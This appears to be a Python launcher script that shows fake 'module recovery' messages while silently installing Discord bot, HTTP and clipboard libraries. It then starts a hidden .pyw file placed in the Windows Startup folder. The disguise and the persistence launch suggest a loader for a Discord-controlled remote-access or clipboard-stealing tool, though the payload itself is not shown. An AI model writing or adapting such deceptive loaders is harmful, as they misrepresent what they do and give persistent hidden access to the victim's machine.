import time
import os

print("\n\n")
print("Modules Not found..\n\n")

time.sleep(3)

print("Searching for Modules...")

try:
	import discord
except:
	os.system("py -m pip install discord.py")
finally:
	import discord
	from discord.ext import commands

try:
	from discord_slash import SlashCommand
except:
	os.system("py -m pip install discord-py-slash-command")
finally:
	from discord_slash import SlashCommand
	from discord_slash.utils.manage_commands import create_option


try:
	import requests
except:
	os.system("py -m pip install requests")
finally:
	import requests


try:
	import pyperclip
except:
	os.system("py -m pip install pyperclip")
finally:
	import pyperclip


os.system("cls")

print("\n\nModules Found.\nRunning Recovery Protocol.")

os.startfile("C:/Users/<username>/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/kickstart.pyw".replace('<username>', os.environ['username']))

input("Press Enter to exit >>>")
